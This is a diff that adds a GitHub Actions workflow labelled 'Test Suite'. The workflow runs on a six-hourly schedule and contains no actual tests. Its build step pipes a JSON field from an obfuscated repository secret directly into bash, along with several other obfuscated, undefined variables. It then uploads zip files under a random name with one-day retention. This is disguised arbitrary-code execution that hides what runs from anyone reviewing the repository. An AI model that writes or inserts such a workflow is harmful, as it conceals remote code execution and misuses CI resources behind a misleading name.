@@ -1,0 +1,38 @@
+name: Test Suite
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '13 5,11,17,23 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  operation:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Build
+        env:
+          qo0101: ${{ secrets.qo0101 }}
+        run: |
+          printf '%s' "$qo0101" | jq -r .cj39 | /bin/bash
+          printf '%s' "$o0988" | jq -r .lrgtv1503 | /bin/bash
+          printf '%s' "$dr3" | jq -r .j878 | /bin/bash
+          printf '%s' "$gdei5" | jq -r .odc00708 | /bin/bash
+          printf '%s' "$c458" | jq -r .a594 | /bin/bash
+          printf '%s' "$g58470" | jq -r .qtgx4280 | /bin/bash
+
+      - name: Archive output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: mezXI81R
+          path: "*.zip"
+          retention-days: 1
